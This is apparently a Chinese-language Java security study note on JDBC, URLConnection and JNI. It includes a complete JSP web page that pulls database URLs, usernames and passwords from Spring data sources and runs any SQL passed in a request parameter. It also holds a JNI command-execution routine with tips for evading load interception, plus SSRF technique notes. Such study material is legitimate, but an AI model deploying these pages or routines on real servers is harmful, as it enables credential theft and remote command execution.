# JDBC

## 0X01 前序

   因为之前学java开发的时候已经较为深入地探讨过这个东西，所以这里的许多东西被简化。

`Class.forName("com.mysql.jdbc.Driver")`注册驱动类，所有jdbc的第一步。

但是许多人应该已经发现了，我们实际的使用过程好像不注册驱动也可以使用。那是因为java的另外一个特性`Java SPI(Service Provider Interface)`

:red_circle:     因为`DriverManager`在初始化的时候会调用`java.util.ServiceLoader`类提供的SPI机制，Java会自动扫描jar包中的`META-INF/services`目录下的文件，并且还会自动的`Class.forName(文件中定义的类)`，这也就解释了为什么不需要`Class.forName`也能够成功连接数据库的原因了。

```
SPI机制是否有安全性问题？
Java反射有那些安全问题？
Java类加载机制是什么？
数据库连接时密码安全问题？
使用JDBC如何写一个通用的数据库密码爆破模块？
```

## 0x02 DataSource

常见的数据源有：`DBCP`、`C3P0`、`Druid`、`Mybatis DataSource`，他们都实现于`javax.sql.DataSource`接口。

Spring数据HACK

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.springframework.context.ApplicationContext" %>
<%@ page import="org.springframework.web.context.support.WebApplicationContextUtils" %>
<%@ page import="javax.sql.DataSource" %>
<%@ page import="java.sql.Connection" %>
<%@ page import="java.sql.PreparedStatement" %>
<%@ page import="java.sql.ResultSet" %>
<%@ page import="java.sql.ResultSetMetaData" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<style>
    th, td {
        border: 1px solid #C1DAD7;
        font-size: 12px;
        padding: 6px;
        color: #4f6b72;
    }
</style>
<%!
    // C3PO数据源类
    private static final String C3P0_CLASS_NAME = "com.mchange.v2.c3p0.ComboPooledDataSource";

    // DBCP数据源类
    private static final String DBCP_CLASS_NAME = "org.apache.commons.dbcp.BasicDataSource";

    //Druid数据源类
    private static final String DRUID_CLASS_NAME = "com.alibaba.druid.pool.DruidDataSource";

    /**
     * 获取所有Spring管理的数据源
     * @param ctx Spring上下文
     * @return 数据源数组
     */
    List<DataSource> getDataSources(ApplicationContext ctx) {
        List<DataSource> dataSourceList = new ArrayList<DataSource>();
        String[]         beanNames      = ctx.getBeanDefinitionNames();

        for (String beanName : beanNames) {
            Object object = ctx.getBean(beanName);

            if (object instanceof DataSource) {
                dataSourceList.add((DataSource) object);
            }
        }

        return dataSourceList;
    }

    /**
     * 打印Spring的数据源配置信息,当前只支持DBCP/C3P0/Druid数据源类
     * @param ctx Spring上下文对象
     * @return 数据源配置字符串
     * @throws ClassNotFoundException 数据源类未找到异常
     * @throws NoSuchMethodException 反射调用时方法没找到异常
     * @throws InvocationTargetException 反射调用异常
     * @throws IllegalAccessException 反射调用时不正确的访问异常
     */
    String printDataSourceConfig(ApplicationContext ctx) throws ClassNotFoundException,
            NoSuchMethodException, InvocationTargetException, IllegalAccessException {

        List<DataSource> dataSourceList = getDataSources(ctx);

        for (DataSource dataSource : dataSourceList) {
            String className = dataSource.getClass().getName();
            String url       = null;
            String UserName  = null;
            String PassWord  = null;

            if (C3P0_CLASS_NAME.equals(className)) {
                Class clazz = Class.forName(C3P0_CLASS_NAME);
                url = (String) clazz.getMethod("getJdbcUrl").invoke(dataSource);
                UserName = (String) clazz.getMethod("getUser").invoke(dataSource);
                PassWord = (String) clazz.getMethod("getPassword").invoke(dataSource);
            } else if (DBCP_CLASS_NAME.equals(className)) {
                Class clazz = Class.forName(DBCP_CLASS_NAME);
                url = (String) clazz.getMethod("getUrl").invoke(dataSource);
                UserName = (String) clazz.getMethod("getUsername").invoke(dataSource);
                PassWord = (String) clazz.getMethod("getPassword").invoke(dataSource);
            } else if (DRUID_CLASS_NAME.equals(className)) {
                Class clazz = Class.forName(DRUID_CLASS_NAME);
                url = (String) clazz.getMethod("getUrl").invoke(dataSource);
                UserName = (String) clazz.getMethod("getUsername").invoke(dataSource);
                PassWord = (String) clazz.getMethod("getPassword").invoke(dataSource);
            }

            return "URL:" + url + "<br/>UserName:" + UserName + "<br/>PassWord:" + PassWord + "<br/>";
        }

        return null;
    }
%>
<%
    String sql = request.getParameter("sql");// 定义需要执行的SQL语句

    // 获取Spring的ApplicationContext对象
    ApplicationContext ctx = WebApplicationContextUtils.getWebApplicationContext(pageContext.getServletContext());

    // 获取Spring中所有的数据源对象
    List<DataSource> dataSourceList = getDataSources(ctx);
	//通过遍历ApplicationContext获取到的所有类，看谁是DataSource的子类，可以判断出数据源对象

    // 检查是否获取到了数据源
    if (dataSourceList == null) {
        out.println("未找到任何数据源配置信息!");
        return;
    }

    out.println("<hr/>");
    out.println("Spring DataSource配置信息获取测试:");
    out.println("<hr/>");
    out.print(printDataSourceConfig(ctx));
    out.println("<hr/>");

    // 定义需要查询的SQL语句
    sql = sql != null ? sql : "select version()";

    for (DataSource dataSource : dataSourceList) {
        out.println("<hr/>");
        out.println("SQL语句:<font color='red'>" + sql + "</font>");
        out.println("<hr/>");

        //从数据源中获取数据库连接对象
        Connection connection = dataSource.getConnection();

        // 创建预编译查询对象
        PreparedStatement pstt = connection.prepareStatement(sql);

        // 执行查询并获取查询结果对象
        ResultSet rs = pstt.executeQuery();

        out.println("<table><tr>");

        // 获取查询结果的元数据对象
        ResultSetMetaData metaData = rs.getMetaData();

        // 从元数据中获取字段信息
        for (int i = 1; i <= metaData.getColumnCount(); i++) {
            out.println("<th>" + metaData.getColumnName(i) + "(" + metaData.getColumnTypeName(i) + ")\t" + "</th>");
        }

        out.println("<tr/>");

        // 获取JDBC查询结果
        while (rs.next()) {
            out.println("<tr>");

            for (int i = 1; i <= metaData.getColumnCount(); i++) {
                out.println("<td>" + rs.getObject(metaData.getColumnName(i)) + "</td>");
            }

            out.println("<tr/>");
        }

        rs.close();
        pstt.close();
    }
%>
```

## 0x03 java web server

 Tomcat JNDI DataSource

 Resin JNDI DataSource

## 0x04 JDBC sql注入

```java
String sql = "select host,user from mysql.user where user = '" + user + "'";
```

经典的sql注入漏洞了。

修复: 预编译

## 0x05 深入jdbc的预编译

```sql
prepare stmt from 'select host,user from mysql.user where user = ?';
set @username='root';
execute stmt using @username;
```



# URLConnection

## 0x01 Dem0

```java
public class URLConnectionDemo {

    public static void main(String[] args) throws IOException {
        URL url = new URL("https://www.baidu.com");

        // 打开和url之间的连接
        URLConnection connection = url.openConnection();

        // 设置请求参数
        connection.setRequestProperty("user-agent", "javasec");
        connection.setConnectTimeout(1000);
        connection.setReadTimeout(1000);
        ...

        // 建立实际连接
        connection.connect();

        // 获取响应头字段信息列表
        connection.getHeaderFields();

        // 获取URL响应
        connection.getInputStream();

        StringBuilder response = new StringBuilder();
        BufferedReader in = new BufferedReader(
                new InputStreamReader(connection.getInputStream()));
        String line;

        while ((line = in.readLine()) != null) {
            response.append("/n").append(line);
        }

        System.out.print(response.toString());
    }
}
```

支持的协议

![image-20211231110256990](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211231110256990.png)

java中的ssrf

```
利用file协议读取文件内容（仅限使用URLConnection|URL发起的请求）
利用http 进行内网web服务端口探测
利用http 进行内网非web服务端口探测(如果将异常抛出来的情况下)
利用http进行ntlmrelay攻击(仅限HttpURLConnection或者二次包装HttpURLConnection并未复写AuthenticationInfo方法的对象)(内网)仅限HttpURLConnection
```

# JNI

定义一个JNI方法

```java
package com.anbai.sec.JNI;

public class CommandExe {
    public static native String exec(String cmd);
}
```

然后生成c的头文件

```
javac -cp . com/anbai/sec/JNI/CommandExe.java
javah -d com/anbai/sec/JNI/ -cp . com.anbai.sec.JNI.CommandExe
// javah -jni HelloWorld
```

JDK10移除了`javah`,需要改为`javac`加`-h`参数的方式生产头文件，如果您的JDK版本正好`>=10`,那么使用如下方式可以同时编译并生成头文件。

```
javac -cp . com/anbai/sec/cmd/CommandExecution.java -h com/anbai/sec/cmd/
```

如果你不想敲命令:https://javaweb.org/?p=1866

`(JNIEnv *, jclass, jstring)`表示分别是`JNI环境变量对象`、`java调用的类对象`、`参数入参类型`。

这里需要注意c和jni和java的数据类型是不一样的，需要我们对它进行转换

| Java类型 | JNI类型  | C/C++类型      | 大小       |
| :------- | :------- | :------------- | :--------- |
| Boolean  | Jblloean | unsigned char  | 无符号8位  |
| Byte     | Jbyte    | char           | 有符号8位  |
| Char     | Jchar    | unsigned short | 无符号16位 |
| Short    | Jshort   | short          | 有符号16位 |
| Int      | Jint     | int            | 有符号32位 |
| Long     | Jlong    | long long      | 有符号64位 |
| Float    | Jfloat   | float          | 32位       |
| Double   | Jdouble  | double         | 64位       |

jstring转char*：`env->GetStringUTFChars(str, &jsCopy) `将jstring参数转成char指针

char*转jstring: `env->NewStringUTF("Hello...")` 将字符指针转换为jstring可以返回

字符串资源释放: `env->ReleaseStringUTFChars(javaString, p);`

看看大哥的字符

```java
//
// Created by yz on 2019/12/6.
//
#include <iostream>
#include <stdlib.h>
#include <cstring>
#include <string>
#include "com_anbai_sec_cmd_CommandExecution.h"

using namespace std;

JNIEXPORT jstring

JNICALL Java_com_anbai_sec_cmd_CommandExecution_exec
        (JNIEnv *env, jclass jclass, jstring str) {

    if (str != NULL) {
        jboolean jsCopy;
        // 将jstring参数转成char指针
        const char *cmd = env->GetStringUTFChars(str, &jsCopy);

        // 使用popen函数执行系统命令
        FILE *fd  = popen(cmd, "r");

        if (fd != NULL) {
            // 返回结果字符串
            string result;

            // 定义字符串数组
            char buf[128];

            // 读取popen函数的执行结果
            while (fgets(buf, sizeof(buf), fd) != NULL) {
                // 拼接读取到的结果到result
                result +=buf;
            }

            // 关闭popen
            pclose(fd);

            // 返回命令执行结果给Java
            return env->NewStringUTF(result.c_str());
        }

    }

    return NULL;
}
```

想学的可以看看别人的文章（懒🐕就算了https://www3.ntu.edu.sg/home/ehchua/programming/java/JavaNativeInterface.html

后面就是把它编译成一个dll文件，然后让java来导入了。

```
// 可以用System.load也加载lib也可以用反射ClassLoader加载,如果loadLibrary0
// 也被拦截了可以换java.lang.ClassLoader$NativeLibrary类的load方法。
```

```
// load命令执行类
Class commandClass = loader.loadClass("com.anbai.sec.cmd.CommandExecution");
```

https://blog.csdn.net/NRlovestudy/article/details/94486142
